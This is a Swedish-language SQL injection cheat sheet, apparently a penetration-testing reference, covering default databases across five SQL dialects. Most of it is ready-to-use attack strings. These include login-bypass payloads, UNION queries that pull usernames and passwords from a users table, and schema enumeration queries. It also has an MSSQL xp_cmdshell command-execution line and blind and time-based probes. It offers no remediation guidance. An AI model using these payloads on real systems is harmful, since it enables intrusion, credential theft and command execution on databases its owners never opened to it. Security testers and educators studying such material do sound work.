# SQL Injection Cheat Sheet

## Vanliga SQL-dialekter & standarddatabaser

| Dialekt            | Standarddatabaser/by default                | Exempel på tabeller                 |
|--------------------|---------------------------------------------|-------------------------------------|
| **MySQL**          | `mysql`, `information_schema`              | `mysql.user`, `information_schema.tables` |
| **PostgreSQL**     | `postgres`, `information_schema`, `pg_catalog` | `pg_user`, `pg_tables`, `pg_roles`     |
| **MSSQL (SQL Server)** | `master`, `tempdb`, `model`, `msdb`     | `sys.databases`, `sysobjects`, `sysusers` |
| **SQLite**         | - (metadata i `sqlite_master`)              | `sqlite_master`, `users`, `data`    |
| **Oracle**         | `SYS`, `SYSTEM`                            | `ALL_USERS`, `ALL_TABLES`, `DBA_USERS` |

---

## Identifiera potentiella sårbarheter

Testa manuellt med t.ex.:

```sql
' OR '1'='1
admin' --
1' OR '1'='1' /*
```

Tecken på sårbarhet:

- SQL-felmeddelanden (syntaxfel, okända kolumner)
- 500 Server error
- Oväntade resultat (alla användare visas, inloggning godkänns utan rätt lösenord)

---

## MySQL Snabbkommandon

```sql
-- Lista databaser
SELECT schema_name FROM information_schema.schemata;

-- Lista tabeller i en viss databas
SELECT table_name FROM information_schema.tables WHERE table_schema='databasnamn';

-- Lista kolumner i en tabell
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

---

## PostgreSQL Snabbkommandon

```sql
-- Lista användare
SELECT usename FROM pg_user;

-- Lista databaser
SELECT datname FROM pg_database;

-- Lista tabeller
SELECT tablename FROM pg_tables WHERE schemaname='public';
```

---

## MSSQL Snabbkommandon

```sql
-- Lista databaser
SELECT name FROM master..sysdatabases;

-- Lista tabeller
SELECT name FROM sysobjects WHERE xtype='U';

-- Exekvera kommandon (om tillåtet)
EXEC xp_cmdshell 'whoami';
```

---

## SQLite Snabbkommandon

```sql
-- Lista alla tabeller
SELECT name FROM sqlite_master WHERE type='table';

-- Läs innehåll från tabell
SELECT * FROM users;
```

---

## Test-payloads

```sql
' OR 1=1 --
admin' OR '1'='1' --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,username,password FROM users --
```

Tips: börja med 1 kolumn och öka tills det fungerar.

---

## Vanliga bypass-tekniker

```sql
' OR 1=1 --
" OR 1=1 --
' OR 'a'='a
admin' #
admin'/*
```

Kommentarssyntax:

- `--` (MySQL, MSSQL, PostgreSQL)
- `#` (MySQL)
- `/* ... */` (alla)

---

## Tips

- **ORDER BY-test** för att räkna kolumner:

```sql

  ' ORDER BY 1 --
  ' ORDER BY 2 --
  ' ORDER BY 3 --
```

- **Blind SQLi** (ingen output, men logik kan manipuleras):

```sql
  ' AND 1=1 --
  ' AND 1=2 --
```

- **Tidsbaserad** (för PostgreSQL, MySQL, etc.):

```sql
  ' OR SLEEP(5) --
  ' OR pg_sleep(5) --
```

---

## Rekommenderade verktyg

- **Burp Suite / Caido**
- **SQLmap**
- **sqlitebrowser**

---
